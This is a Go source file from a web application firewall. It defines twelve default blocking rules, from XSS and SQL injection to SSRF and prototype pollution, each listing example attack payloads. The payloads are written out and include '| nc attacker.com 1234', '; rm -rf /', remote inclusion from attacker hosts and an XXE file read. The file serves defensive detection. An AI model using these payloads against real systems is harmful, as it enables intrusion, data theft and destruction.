package api

// DefaultRule rappresenta una regola di default hardcoded nel WAF
type DefaultRule struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Type        string `json:"type"`
	Description string `json:"description"`
	Severity    string `json:"severity"`
	Examples    []string `json:"examples"`
	IsDefault   bool   `json:"is_default"`
	Enabled     bool   `json:"enabled"`
}

// GetDefaultRules returns all default rules implemented in the WAF
// These rules BLOCK attacks, they don't just detect them
func GetDefaultRules() []DefaultRule {
	return []DefaultRule{
		{
			ID:        "default_xss",
			Name:      "Cross-Site Scripting (XSS)",
			Type:      "XSS",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks Cross-Site Scripting (XSS) attempts. Monitors script tags, event handlers, dangerous JS functions and encoding.",
			Examples: []string{
				"<script>alert('xss')</script>",
				"<img src=x onerror=alert(1)>",
				"javascript:alert('xss')",
				"<body onload=alert('xss')>",
				"eval(atob('...'))",
				"setTimeout(alert)",
			},
		},
		{
			ID:        "default_sqli",
			Name:      "SQL Injection",
			Type:      "SQL_INJECTION",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks SQL Injection attempts. Includes patterns for UNION-based, boolean-based, time-based blind and stacked queries.",
			Examples: []string{
				"' OR '1'='1",
				"' OR 1=1 --",
				"admin' --",
				"UNION SELECT * FROM users",
				"'; DROP TABLE users; --",
				"SLEEP(5)",
				"BENCHMARK(1000,MD5('A'))",
				"' UNION ALL SELECT NULL,NULL FROM information_schema.tables",
			},
		},
		{
			ID:        "default_nosql",
			Name:      "NoSQL Injection",
			Type:      "NOSQL_INJECTION",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks NoSQL Injection attempts. Monitors MongoDB operators and query injection.",
			Examples: []string{
				"{\"$ne\": null}",
				"{\"$gt\": \"\"}",
				"[$ne]=",
				"[$gt]=",
				"db.users.find({$where:\"this.password=='123'\"})",
				"{\"$regex\": \".*\"}",
			},
		},
		{
			ID:        "default_lfi",
			Name:      "Local File Inclusion (LFI)",
			Type:      "LFI",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks Local File Inclusion attempts. Monitors path traversal and local file inclusions.",
			Examples: []string{
				"../../../etc/passwd",
				"....//....//etc/passwd",
				"php://filter/convert.base64-encode/resource=index.php",
				"/etc/passwd%00.txt",
				"..\\..\\..\\windows\\system32\\config\\sam",
			},
		},
		{
			ID:        "default_path_traversal",
			Name:      "Path Traversal",
			Type:      "PATH_TRAVERSAL",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks path traversal attempts to access unauthorized directories.",
			Examples: []string{
				"../../../etc/passwd",
				"..\\..\\..\\windows\\system32",
				"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			},
		},
		{
			ID:        "default_rfi",
			Name:      "Remote File Inclusion (RFI)",
			Type:      "RFI",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks Remote File Inclusion attempts. Prevents inclusion of remote files.",
			Examples: []string{
				"?file=http://evil.com/shell.php",
				"?page=ftp://attacker.com/malware.txt",
				"include('http://attacker.com/backdoor.php')",
			},
		},
		{
			ID:        "default_cmd_injection",
			Name:      "Command Injection",
			Type:      "COMMAND_INJECTION",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks Command Injection attempts. Prevents system command execution.",
			Examples: []string{
				"; ls -la",
				"| cat /etc/passwd",
				"& whoami",
				"`ping 127.0.0.1`",
				"$(whoami)",
				"; rm -rf /",
				"| nc attacker.com 1234",
			},
		},
		{
			ID:        "default_xxe",
			Name:      "XML External Entity (XXE)",
			Type:      "XXE",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks XXE attacks. Prevents access to local files via XML.",
			Examples: []string{
				"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
				"<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">",
			},
		},
		{
			ID:        "default_ssrf",
			Name:      "Server-Side Request Forgery (SSRF)",
			Type:      "SSRF",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks SSRF attempts. Prevents access to internal server resources.",
			Examples: []string{
				"http://localhost:8080/admin",
				"http://127.0.0.1:3306",
				"http://169.254.169.254/latest/meta-data/",
				"gopher://localhost:9000",
			},
		},
		{
			ID:        "default_ldap",
			Name:      "LDAP Injection",
			Type:      "LDAP_INJECTION",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks LDAP Injection attempts. Protects against manipulated LDAP queries.",
			Examples: []string{
				"*)(uid=*",
				"admin*",
				"*)(|(uid=*",
			},
		},
		{
			ID:        "default_ssti",
			Name:      "Server-Side Template Injection (SSTI)",
			Type:      "SSTI",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks SSTI attempts. Protects Jinja2, ERB, Thymeleaf and other template engines.",
			Examples: []string{
				"{{ 7 * 7 }}",
				"<%= 7 * 7 %>",
				"#{7*7}",
				"${7*7}",
				"*{7*7}",
			},
		},
		{
			ID:        "default_resp_split",
			Name:      "HTTP Response Splitting",
			Type:      "HTTP_RESPONSE_SPLITTING",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks Response Splitting attempts. Prevents header injection.",
			Examples: []string{
				"HTTP/1.1 200 OK\\r\\n\\r\\n",
				"\\r\\nSet-Cookie: admin=true",
				"%0d%0aSet-Cookie:%20admin=1",
			},
		},
		{
			ID:        "default_proto_pollution",
			Name:      "Prototype Pollution",
			Type:      "PROTOTYPE_POLLUTION",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Blocks Prototype Pollution attempts. Protects JavaScript applications.",
			Examples: []string{
				"?__proto__[isAdmin]=true",
				"?constructor[prototype][isAdmin]=true",
				"{\"__proto__\": {\"isAdmin\": true}}",
			},
		},
	}
}
